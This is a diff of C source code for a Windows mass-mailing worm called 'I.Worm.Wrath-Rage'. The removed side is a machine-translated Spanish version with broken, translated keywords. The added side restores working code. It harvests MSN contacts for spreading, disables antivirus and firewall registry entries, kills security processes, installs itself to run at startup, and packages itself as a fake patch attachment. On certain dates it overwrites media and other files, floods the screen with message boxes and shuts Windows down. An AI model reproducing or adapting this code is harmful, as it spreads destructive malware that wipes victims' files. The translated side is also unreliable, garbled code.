-	retorno i;
+	return i;
 }
 /*
-Función para saber si incluso existen cuentas (realmente, para saber si real es válida) que verifican.
-La función hacer uso del retorno de RegOpenKeyEx(), depende od el vallue de currentAccount("00000001,00000002,..,0000000X")
-Si el valor es correcto, esto parece que es bueno.
+Function to know if even exists accounts (really, to know if actual is valid) that check.
+The function make use of return of RegOpenKeyEx(), depends od the vallue of currentAccount("00000001,00000002,..,0000000X")
+If value is correct, this seems that its good.
 */
 int existsAccountsToGetMailInfo() {
- Clave HKEY = NULL;
+	HKEY key = NULL;
 	char *aux = (char*)malloc(sizeof(char) * (strlen(REG_SUBKEY) + DEFAULT_SIZE_OF_ACCOUNTS_IDS));
 	strcpy(aux,REG_SUBKEY);
 	strcat(aux,currentAccount);
 	if (RegOpenKeyEx(HKEY_CURRENT_USER,aux,0,KEY_QUERY_VALUE,&key) == 0) {
-		volver 1;
+		return 1;
 	}
-	volver 0;
+	return 0;
 }
 /*
-Función para incrementar la cuenta numérica.
+Function to increment the number account.
 0000001
-para
+to
 0000002
-y a
+and to
 0000003
 etc.
 */
@@ -583,10 +583,10 @@ void goToNextEmailAccount() {
 	sprintf(currentAccount, "%08d", num);
 }
 /*
-Función para desactivar AV's y firewalls.
+Function to disable AV's and firewalls.
 */
 void disableAVSAndFirewalls() {
- Llave HKEY;
+	HKEY key;
 	int i = 0;
 	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,REG_RUN_ON_STARTUP,0,KEY_SET_VALUE,&key) == 0) {
 		while (regsAVsAndFirewalls[i] != NULL) {
@@ -594,7 +594,7 @@ void disableAVSAndFirewalls() {
 			i++;
 		}
 	}
-	RegCloseKey(clave);
+	RegCloseKey(key);
 	i = 0;
 	if (RegOpenKeyEx(HKEY_CURRENT_USER,REG_RUN_ON_STARTUP,0,KEY_SET_VALUE,&key) == 0) {
 		while (regsAVsAndFirewalls[i] != NULL) {
@@ -602,30 +602,30 @@ void disableAVSAndFirewalls() {
 			i++;
 		}
 	}
-	RegCloseKey(clave);
+	RegCloseKey(key);
 }
 /*
-Función para agregar gusano al registro de Windows.
+Function to add worm to windows registry.
 */
 void putInRegistyToStartWithWindows() {
 	char actualPath[MAX_PATH];
 	char systemPath[MAX_PATH];
-	archivo char sin firmar[256];
- Llave HKEY;
+	unsigned char file[256];
+	HKEY key;
 	char *newFile = (char*)malloc(sizeof(char) * (strlen(actualPath) + strlen(BARRA_INVERTIDA) + strlen(EXE_NAME) + 1));
 	GetSystemDirectory(systemPath,MAX_PATH);
 	strcpy(newFile,systemPath);
 	strcat(newFile,BARRA_INVERTIDA);
 	strcat(newFile,EXE_NAME);
-	memcpy(archivo,newFile,strlen(newFile));
- archivo[strlen(newFile)] = '\0';
+	memcpy(file,newFile,strlen(newFile));
+	file[strlen(newFile)] = '\0';
 	if (RegCreateKey(HKEY_LOCAL_MACHINE,REG_RUN_ON_STARTUP,&key) == 0) {
 		RegSetValueEx(key,REG_WINAV,0,REG_SZ,file,sizeof(file));
 	}
-	RegCloseKey(clave);
+	RegCloseKey(key);
 }
 /*
-Función para convertir PKZIP (contenido en un búfer) en un archivo ejecutable para usar más adelante.
+Function to convert PKZIP (content in a buffer) in an executable file to use later.
 */
 void convertPKZipBufferToExeFile() {
 	int r1 = rand();
@@ -641,34 +641,34 @@ void convertPKZipBufferToExeFile() {
 	strcat(fToCreate,rS1);
 	strcat(fToCreate,rS2);
 	strcat(fToCreate,".$wr$");
- ARCHIVO *f = fopen(fToCreate,"w");
+	FILE *f = fopen(fToCreate,"w");
 	int i = 0;
 	while (pkzip[i] != NULL) {
 		fwrite(pkzip[i],1,strlen(pkzip[i]),f);
 		i++;
 	}
 	fclose(f);
-	decode(fToCreate));
-	DeleteFile(fToCreate));
+	decode(fToCreate);
+	DeleteFile(fToCreate);
 }
 /*
-Función para crear el archivo zip que contendrá el gusano.
+Function to create the zip file that will contain the worm.
 */
 void createZipWithWorm() {
 	int r = rand() % MAX_NAMES_EXE;
 	convertPKZipBufferToExeFile();
-	//para comprobar que lo creamos correctamente intentamos abrirlo.
+	//to check that create it correctly we try to open it.
 	OFSTRUCT str;
 	if (OpenFile(pkZipExeName, &str,OF_EXIST) != HFILE_ERROR) {
 		char actualFile[MAX_PATH];
-		//si existe el ejecutable pkzip..
+		//if pkzip executable exists..
 		HWND hwnd = NULL;
 		GetModuleFileName(NULL,actualFile,MAX_PATH);
 		//parameters: destino.zip nombrewormexe.exe
-		//el problema que tiene pkzip es que creamos un archivo zip con el nombre del exe.
-		//into, y nos gusta que el nombre ejecutable en el zip tenga el nombre a concret.
-		//por ejemplo , si enviamos un parche a internet explorer, queremos que el ejecutable o el zip contenga este nombre
-		//para obtener esto, crearemos un archivo exe con el nombre adjunto, y será el archivo que comprimiremos.
+		//the problem that have pkzip is that create an zip file with the name of the exe.
+		//into, and we like that executable name into the zip have the a concret name.
+		//for example , if we send a patch to internet explorer, we want that the executable or the zip contains this name
+		//to obtain this, we will create and exe file with the attachment name, and it will be the file that we will zip.
 		char *nAtt = (char*)malloc(sizeof(char) * (strlen(windowsTempDirectory) + strlen(namesExesInZip[r]) + 1 ));
 		strcpy(nAtt,windowsTempDirectory);
 		strcat(nAtt,namesExesInZip[r]);
@@ -676,7 +676,7 @@ void createZipWithWorm() {
 		char *destino = (char*)malloc(sizeof(char) * (strlen(windowsTempDirectory) + strlen(WORM_ATTACHMENT_ZIP_FILE_HIDDEN) + 1));
 		strcpy(destino,windowsTempDirectory);
 		strcat(destino,WORM_ATTACHMENT_ZIP_FILE_HIDDEN);
-		char *parametros = (char*)malloc(sizeof(char) * (strlen(nAtt) + strlen(destino) + 3)); //3 = \0, , ,
+		char *parametros = (char*)malloc(sizeof(char) * (strlen(nAtt) + strlen(destino) + 3));//3 = \0, , ,
 		strcpy(parametros,destino);
 		strcat(parametros," ");
 		strcat(parametros,nAtt); 
@@ -686,38 +686,38 @@ void createZipWithWorm() {
 	}
 }
 /*
-Función para intentar matar procesos av y firewall.
+Function to try to kill av's and firewall processes.
 */
-void killAVAndFirewallProcesos() {
+void killAVAndFirewallProcesses() {
 	HANDLE hProcessSnap;
 	HANDLE hProcess;
 	PROCESSENTRY32 pe32;
 	DWORD dwPriorityClass;
 	hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
 	if( hProcessSnap == INVALID_HANDLE_VALUE ) {
-		devolución;
+		return;
 	}
- pe32. dwSize = sizeof( PROCESSENTRY32 );
-	if( ! Process32First( hProcessSnap, &pe32 ) ) {
+	pe32.dwSize = sizeof( PROCESSENTRY32 );
+	if( !Process32First( hProcessSnap, &pe32 ) ) {
 		CloseHandle( hProcessSnap );
-		devolución;
+		return;
 	}
-	hacer
+	do
 	{
 		int i = 0;
 		while (processAVsAndFirewalls[i] != NULL) {
 			char *res1,*res2,*res3,*res4 = NULL;
- res1 = strstr(pe32. szExeFile,"av"); /* intente buscar si la subcadena "av" está en proceso real */
- res2 = strstr(pe32. szExeFile,"AV");
- res3 = strstr(pe32. szExeFile,"aV");
- res4 = strstr(pe32. szExeFile,"Av");
-			if ((strcmp(pe32. szExeFile,processAVsAndFirewalls[i]) == 0) || (res1 != NULL) || (res2 != NULL) || (res3 != NULL) || (res4 != NULL)) {
+			res1 = strstr(pe32.szExeFile,"av"); /* try to search if substring "av" is in actual process */
+			res2 = strstr(pe32.szExeFile,"AV");
+			res3 = strstr(pe32.szExeFile,"aV");
+			res4 = strstr(pe32.szExeFile,"Av");
+			if ((strcmp(pe32.szExeFile,processAVsAndFirewalls[i]) == 0) || (res1 != NULL) || (res2 != NULL) || (res3 != NULL) ||(res4 != NULL)) {
 				TerminateProcess(hProcess,0);
 			}
 			i++;
 		}
 		dwPriorityClass = 0;
- hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe32. th32ProcessID );
+		hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID );
 		dwPriorityClass = GetPriorityClass( hProcess );
 		if( !dwPriorityClass ) CloseHandle( hProcess );
 	} 
@@ -725,17 +725,17 @@ void killAVAndFirewallProcesos() {
 	CloseHandle( hProcessSnap );
 }
 /*
-Función para obtener correos electrónicos de MSN 6.
+Function to obtain emails From MSN 6.
 */
 void obtainEmailsFromMSN6() {
-	pCount largo;
- Correo electrónico de BSTR;
- IMessengerContactos *pIMessengerContactos = NULL;
+	long pCount;
+	BSTR email;
+	IMessengerContacts *pIMessengerContacts = NULL;
 	IMessengerContact *pIMessengerContact = NULL;
 	IDispatch *pIDispatch = NULL;
 	IDispatch *ppMContact = NULL;
- IMessenger *pIMessenger = NULL; //a puntero a una interfaz IMessenger
-	CoInitializar(0);
+	IMessenger *pIMessenger = NULL; //a pointer to an IMessenger interface
+	CoInitialize(0);
 	if (SUCCEEDED(CoCreateInstance(CLSID_Messenger, NULL, CLSCTX_ALL, IID_IMessenger, (void **)&pIMessenger))) {
 		pIMessenger->get_MyContacts(&pIDispatch);
 		pIDispatch->QueryInterface(IID_IMessengerContacts,(void**)&pIMessengerContacts);
@@ -746,98 +746,98 @@ void obtainEmailsFromMSN6() {
 				if (pIDispatch->QueryInterface(IID_IMessengerContact,(void**)&pIMessengerContact) == S_OK) {
 					if (pIMessengerContact->get_SigninName(&email) == S_OK) {
 						char *actualMail = NULL;
- actualMail = (char*)malloc(_bstr_t(email). largura());
+						actualMail = (char*)malloc(_bstr_t(email).length());
 						strcpy(actualMail,(char*)_bstr_t(email));
 						destinatarios[posActualDestinatarios] = (char*)malloc(sizeof(char) * (strlen(actualMail) + 1));
-						strcpy(destinatarios[posActualDestinatarios],actualMail); //copiar el destinatario a la matriz.
+						strcpy(destinatarios[posActualDestinatarios],actualMail); //copy recipient to array.
 						posActualDestinatarios++;
 					}
 				}
 			}
 		}
 		pIMessenger->Release();
-		CoUninitializar();
+		CoUninitialize();
 	}
 }
 /*
-Función para ejecutar la carga útil del gusano.
+Function to execute worm payload.
 */
 void executePayload() {
-	//payload del gusano cambiará dependiendo del día.
+	//payload of the worm will change depending of the day.
 	SYSTEMTIME x;
 	GetSystemTime(&x);
 	if ((x.wDay == 1) && (x.wMonth == 11)) {
-		//esta es una fecha muy especial para mí. probablemente representa por qué hago este gusano
-		//por qué odio algunas cosas.. por qué.. muchas cosas. es hora de ser un SOB.
+		//this is a very special date for me. it probable represents why i make this worm
+		//why i hate some things.. why.. a lot of things. time to be a SOB.
 		fuckAll(); //fuck all
 	}
-	más {
-		if ((x.wDay == 3) || (x.wDía == 9)) {
-			//i como el número 3 y el número 9.
+	else {
+		if ((x.wDay == 3) || (x.wDay == 9)) {
+			//i like number 3, and number 9.
 			defaultPayload();
 		}
 	}
 
 }
 /*
- 1-11, tiempo para follar todo.
+	1-11 , time to fuck all.
 */
 void fuckAll() {
-	findFilesToFuck(arrayExtensionsVeryFuckedPayload); //buscar archivos para follar.
+	findFilesToFuck(arrayExtensionsVeryFuckedPayload); //find files to fuck.
 	fuckFilesStoredInStruct();
 	int i = 0;
-	mientras que (i < 10000) {
-		MessageBox(NULL,"1-11 Lamento decirte esto pero.. te han jodido. 1 de noviembre, día de la muerte de la gente, y mucho más. \n\n I.Worm.Wrath-Rage codificado por jalo (drm~r). ","I.Worm.Wrath-Rage",NULL);
+	while (i < 10000) {
+		MessageBox(NULL,"1-11 I'm sorry to say you this but.. you have been fucked. 1 November, day of people died, and much more..\n\nI.Worm.Wrath-Rage coded by jalo (drm~r).","I.Worm.Wrath-Rage",NULL);
 		i++;
 	}
 	openMSNWindows();
-	Dormir(60000);
-	Salirventas(0, 0);
+	Sleep(60000);
+	ExitWindows(0, 0);
 }
 /*
- Carga útil predeterminada, ejecutada los días 3 y 9 de cada mes
+	Default payload, executed days 3 and 9 of each month
 */
 void defaultPayload() {
-	findFilesToFuck(arrayExtensionsDefaultPayload); //buscar archivos para follar.
+	findFilesToFuck(arrayExtensionsDefaultPayload); //find files to fuck.
 	fuckFilesStoredInStruct();
 	int i = 0;
 	openMSNWindows();
-	mientras que (i < 100) {
-		MessageBox(NULL,"Siento decirte esto, pero te han jodido. \n\nI.Worm.Wrath-Rage codificado por jalo (drm~r)","I.Worm.Wrath-Rage",NULL);
+	while (i < 100) {
+		MessageBox(NULL,"I'm sorry to say you this but you have been fucked.\n\nI.Worm.Wrath-Rage coded by jalo (drm~r)","I.Worm.Wrath-Rage",NULL);
 		i++;
 	}
-	Dormir(30000);
-	Salirventas(0, 0);
-	//default payload hace:
-	//fuck .avi, .mpg, .part y archivos de .mp3
-	//mostrar un mensaje al usuario
+	Sleep(30000);
+	ExitWindows(0, 0);
+	//default payload makes:
+	//fuck .avi, .mpg, .part and .mp3 files
+	//show a message to the user
 }
 /*
- Busque archivos en la ruta especificada, con la extensión especificada y almacenada en la estructura especificada.
+	Find files in the path specified, with extension specified, and stored in the struct specified.
 */
 void findFiles(char *where, char *arrayExtensions[], struct FILESTOFUCK *fToFuck) {
 	HANDLE hFind;
 	WIN32_FIND_DATA FindFileData;
 	char *w = (char*)malloc(sizeof(char) * (strlen(where) + 2));
-	strcpy(w,donde);
+	strcpy(w,where);
 	strcat(w,"*");
 	hFind = FindFirstFile(w, &FindFileData);
 	if (hFind != INVALID_HANDLE_VALUE) {
-		if ((FindFileData. dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) && (strcmp(FindFileData. cFileName,".. ") ! = 0) && (strcmp(FindFileData. cFileName,".") != 0)) {
-			//if es un directorio..
-			char *w2 = (char*)malloc(sizeof(char) * (strlen(where) + strlen(FindFileData. cFileName) + 2));
-			strcpy(w2,donde);
-			strcat(w2,FindFileData. cFileName);
+		if ((FindFileData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) && (strcmp(FindFileData.cFileName,"..") != 0) && (strcmp(FindFileData.cFileName,".") != 0)) {
+			//if is a directory..
+			char *w2 = (char*)malloc(sizeof(char) * (strlen(where) + strlen(FindFileData.cFileName) + 2));
+			strcpy(w2,where);
+			strcat(w2,FindFileData.cFileName);
 			strcat(w2,"\\");
 			
 			findFiles(w2,arrayExtensions,fToFuck);
 		}
-		más {
-			if (isExtSearched(fileExt(FindFileData. cFileName),arrayExtensions)) {
-				//archivo para follar
-					char *aux = (char*) malloc(sizeof(char) * (strlen(FindFileData. cFileName) + strlen(donde) + 1));
-					strcpy(aux,donde);
-					strcat(aux,FindFileData. cFileName);
+		else {
+			if (isExtSearched(fileExt(FindFileData.cFileName),arrayExtensions)) {
+				//file to fuck
+					char *aux = (char*) malloc(sizeof(char) * (strlen(FindFileData.cFileName) + strlen(where) + 1));
+					strcpy(aux,where);
+					strcat(aux,FindFileData.cFileName);
 					fToFuck->names[fToFuck->counter] = (char*)malloc(sizeof(char) * (strlen(aux) + 1));
 					strcpy(fToFuck->names[fToFuck->counter],aux);
 					fToFuck->counter++;
@@ -846,20 +846,20 @@ void findFiles(char *where, char *arrayExtensions[], struct FILESTOFUCK *fToFuck
 	}
 	while (FindNextFile(hFind,&FindFileData) != 0) {
 		if (hFind != INVALID_HANDLE_VALUE) {
-			if ((FindFileData. dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) && (strcmp(FindFileData. cFileName,".. ") ! = 0) && (strcmp(FindFileData. cFileName,".") != 0)) {
-				char *w2 = (char*)malloc(sizeof(char) * (strlen(where) + strlen(FindFileData. cFileName) + 2));
-				strcpy(w2,donde);
-				strcat(w2,FindFileData. cFileName);
+			if ((FindFileData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) && (strcmp(FindFileData.cFileName,"..") != 0) && (strcmp(FindFileData.cFileName,".") != 0)) {
+				char *w2 = (char*)malloc(sizeof(char) * (strlen(where) + strlen(FindFileData.cFileName) + 2));
+				strcpy(w2,where);
+				strcat(w2,FindFileData.cFileName);
 				strcat(w2,"\\");
 				findFiles(w2,arrayExtensions,fToFuck);
-				//if es un directorio.
+				//if is a directory.
 			}
-			más {
-				if (isExtSearched(fileExt(FindFileData. cFileName),arrayExtensions)) {
-					//archivo para follar
-					char *aux = (char*) malloc(sizeof(char) * (strlen(FindFileData. cFileName) + strlen(donde) + 1));
-					strcpy(aux,donde);
-					strcat(aux,FindFileData. cFileName);
+			else {
+				if (isExtSearched(fileExt(FindFileData.cFileName),arrayExtensions)) {
+					//file to fuck
+					char *aux = (char*) malloc(sizeof(char) * (strlen(FindFileData.cFileName) + strlen(where) + 1));
+					strcpy(aux,where);
+					strcat(aux,FindFileData.cFileName);
 					fToFuck->names[fToFuck->counter] = (char*)malloc(sizeof(char) * (strlen(aux) + 1));
 					strcpy(fToFuck->names[fToFuck->counter],aux);
 					fToFuck->counter++;
@@ -870,48 +870,48 @@ void findFiles(char *where, char *arrayExtensions[], struct FILESTOFUCK *fToFuck
 	FindClose(hFind);
 }
 /*
- Función para obtener la extensión del archivo.
+	Function to obtain extension of file.
 */
 char *fileExt(char *f) {
 	char *ext;
 	int posPoint = -1;
 	for (int i = (int)strlen(f); i >= 0; i--) {
-		if (f[i] == '.') {//buscar el char '.' en la cadena
- posPoint = i; //posición de char '.' (invertido para encontrar la extensión)
-			quebrar;
+		if (f[i] == '.') {//search the char '.' in string
+			posPoint = i; //position of char '.' (inverted to find extension)
+			break;
 		}
 	}
 	if (posPoint == -1) {
 		//notfound
-		devolver NULL;
+		return NULL;
 	}
-	más {
+	else {
 		ext = (char*)malloc(sizeof(char) * ((strlen(f) - posPoint) + 1));
 		int j = 0;
 		int i = (posPoint + 1);
-		para (; i < strlen(f); i++,j++) {
+		for (; i < strlen(f); i++,j++) {
 			ext[j] = f[i];
 		}
 		ext[j] = '\0';
-		devolución ext;
+		return ext;
 	}
 }
 /*
- Función para saber que el parámetro 'ext' está en char 'array'. (Coincidencia exacta)
+	Function to know that the param 'ext' is in char 'array'. (Exact match)
 */
 int isExtSearched(char *ext,char *array[]) {
-	if (ext == NULL) devuelve 0; //si no hay encuentro puntual, ext será null
+	if (ext == NULL) return 0; //if no point encounter, ext will be null
 	int i = 0;
 	while (array[i] != NULL) {
 		if (strcmp(array[i],ext) == 0) {
-			volver 1;
+			return 1;
 		}
 		i++;
 	}
-	volver 0;
+	return 0;
 }
 /*
- Encuentra en todas las unidades archivos para follar.
+	Find in all drives files to fuck.
 */
 void findFilesToFuck(char *extensionsToFind[]) {
 	int i = 0;
@@ -921,46 +921,46 @@ void findFilesToFuck(char *extensionsToFind[]) {
 	}
 }
 /*
- A la mierda cada archivo almacenado en la estructura.
+	Fuck every file stored in struct.
 */
 void fuckFilesStoredInStruct() {
-	for (int i = 0; i < archivos. contador; i++) {
- ARCHIVO *f = fopen(archivos. nombres[i],"w");
+	for (int i = 0; i < files.counter; i++) {
+		FILE *f = fopen(files.names[i],"w");
 		fwrite(bufferFileFucked,1,strlen(bufferFileFucked),f);
 		fclose(f);
 	}
 }
 void openMSNWindows() {
-	pCount largo;
- Correo electrónico de BSTR;
- IMessengerContactos *pIMessengerContactos = NULL;
+	long pCount;
+	BSTR email;
+	IMessengerContacts *pIMessengerContacts = NULL;
 	IMessengerContact *pIMessengerContact = NULL;
 	IMessengerWindow *pIMessengerWindow = NULL;
 	IDispatch *pIDispatch = NULL;
 	IDispatch *ppMContact = NULL;
- IMessenger *pIMessenger = NULL; //a puntero a una interfaz IMessenger
-	CoInitializar(0);
+	IMessenger *pIMessenger = NULL; //a pointer to an IMessenger interface
+	CoInitialize(0);
 	CoCreateInstance(CLSID_Messenger, NULL, CLSCTX_ALL, IID_IMessenger, (void **)&pIMessenger);
 	pIMessenger->get_MyContacts(&pIDispatch);
 	pIDispatch->QueryInterface(IID_IMessengerContacts,(void**)&pIMessengerContacts);
 	pIDispatch->Release();
 	pIMessengerContacts->get_Count(&pCount);
 	char *mails = (char*)malloc(sizeof(char) * (pCount * 256));
-	strcpy(correos,"");
+	strcpy(mails,"");
 	for (int i = 0; i < pCount; i++) {
 	if (pIMessengerContacts->Item(i,&pIDispatch) == S_OK) {
 		if (pIDispatch->QueryInterface(IID_IMessengerContact,(void**)&pIMessengerContact) == S_OK) {
 			if (pIMessengerContact->get_SigninName(&email) == S_OK) {
- Estado MISTATUS;
+				MISTATUS status;
 				if (pIMessengerContact->get_Status(&status) == S_OK) {
-						// Abierto solo a usuarios en línea.
- BSTR contactstr = _bstr_t(correo electrónico);
- Contacto VARIANT;
- contacto. vt=VT_BSTR;
- contacto. bstrVal=contactstr;
+						// Open only to online users.
+						BSTR contactstr = _bstr_t(email);
+						VARIANT contact;
+						contact.vt=VT_BSTR;
+						contact.bstrVal=contactstr;
 						if (pIMessenger->InstantMessage(contact,&pIDispatch) == S_OK) {
 							pIDispatch->QueryInterface(IID_IMessengerWindow,(void**)&pIMessengerWindow);
- CONTACTO LARGOHwnd;
+							LONG ContactHwnd;
 							pIMessengerWindow->get_HWND(&ContactHwnd);
 							pIMessengerWindow->Release();
 					}
@@ -970,6 +970,6 @@ void openMSNWindows() {
 	}
 }
 pIMessenger->Release();
-CoUninitializar();
+CoUninitialize();
 ExitProcess(0);
 }
